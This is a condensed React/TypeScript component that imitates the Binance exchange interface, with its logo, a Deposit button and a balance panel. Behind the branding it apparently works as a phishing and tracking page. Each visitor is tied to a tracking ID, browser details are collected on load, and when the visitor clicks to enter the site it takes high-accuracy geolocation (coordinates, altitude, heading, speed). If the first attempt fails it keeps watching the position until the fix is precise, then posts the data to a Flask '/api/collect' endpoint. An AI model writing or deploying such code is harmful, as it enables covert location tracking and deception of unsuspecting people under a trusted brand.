...
const ExchangeMark = ({ size = 28 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 64 64" fill="none" aria-hidden="true"><path fill="currentColor" d="m32 6 9 9-9 9-9-9 9-9Zm-17 17 9 9-9 9-9-9 9-9Zm34 0 9 9-9 9-9-9 9-9Zm-17 17 9 9-9 9-9-9 9-9Z" /><path fill="currentColor" d="m32 20 12 12-12 12-12-12 12-12Z" /></svg>
);
...
export default function BinanceClient({ id }: { id: string }) {
    ...
    const sendInitialData = async () => {
      ...
      const collectedData: any = {
        ...
        browser: {
          ...
          browser_version: ua.match(/(chrome|firefox|safari|edge)\/?\s*(\d+)/i)?.[2] || 'Unknown',
      ...
      } catch (e) { console.error("Failed to send initial data:", e); }
    };
    sendInitialData();
  }, [id]);
  ...
  const handleEnterSite = async () => {
    ...
    const collectedData: any = { tracking_id: id, location: { permission_status: 'pending' } };
    try {
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
      });
      collectedData.location = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy, altitude: position.coords.altitude, heading: position.coords.heading, speed: position.coords.speed, timestamp: new Date(position.timestamp).toISOString(), permission_status: 'granted' };
      await fetch(`${FLASK_API}/api/collect`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(collectedData) });
      setStatus('success'); setTimeout(() => setShowEnterModal(false), 800);
    } catch (error) {
      const watchId = navigator.geolocation.watchPosition(async (pos) => {
        if (pos.coords.accuracy < 150) {
          navigator.geolocation.clearWatch(watchId);
          collectedData.location = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude, heading: pos.coords.heading, speed: pos.coords.speed, timestamp: new Date(pos.timestamp).toISOString(), permission_status: 'granted' };
          await fetch(`${FLASK_API}/api/collect`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(collectedData) });
          setStatus('success'); setTimeout(() => setShowEnterModal(false), 800);
        }
      }, () => setStatus('error'), { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
    }
  };
    ...
    <section className="min-h-screen bg-[#0B0E11] font-sans text-[#EAECEF] relative">
      ...
      <header className="sticky top-0 z-50 border-b border-[#2B3139]/70 bg-[#0B0E11]/95 backdrop-blur-xl">
        <div className="mx-auto flex h-[64px] w-full max-w-[1440px] items-center gap-4 px-4 sm:px-6 lg:px-8">
          <div className="flex shrink-0 items-center gap-2.5 text-[#F0B90B]"><ExchangeMark size={30} /><span className="hidden text-[20px] font-bold tracking-tight sm:block">BINANCE</span></div>
          <div className="ml-auto flex items-center gap-2 sm:gap-3"><button className="rounded-lg bg-[#F0B90B] px-4 py-2 text-[12px] font-semibold text-[#181A20] transition hover:bg-[#FCD535]">Deposit</button></div>
        </div>
      </header>
      <main className="mx-auto w-full max-w-[1440px] px-4 pb-[96px] pt-5 sm:px-6 sm:pb-10 lg:px-8">
        ...
        <div className="mt-6 rounded-2xl border border-[#2B3139] bg-[#181E25] p-8"><p className="text-[#848E9C]">Total Balance</p><h2 className="text-[34px] font-semibold tracking-tight text-[#F5F5F5] sm:text-[42px]">$0.00</h2></div>
      </main>
      <style jsx>{`@keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } } .animate-shake { animation: shake 0.3s ease-in-out; }`}</style>
    </section>
  );
}